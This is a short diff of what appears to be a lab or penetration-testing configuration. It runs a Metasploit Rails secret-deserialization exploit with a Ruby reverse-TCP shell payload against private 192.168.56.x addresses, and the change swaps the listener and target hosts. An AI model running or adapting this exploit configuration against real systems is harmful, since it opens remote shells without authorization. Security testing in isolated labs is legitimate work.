@@ -16,10 +16,10 @@ commands:
     cmd: "exploit/multi/http/rails_secret_deserialization"
     payload: "ruby/shell_reverse_tcp"
     payload_options:
-      LHOST: "192.168.56.181"
+      LHOST: "192.168.56.191"
       LPORT: "4444"
     options:
-      RHOSTS: "192.168.56.191"
+      RHOSTS: "192.168.56.181"
       RPORT: "8181"
       TARGETURI: "/"
       SECRET: "a7aebc287bba0ee4e64f947415a94e5f"
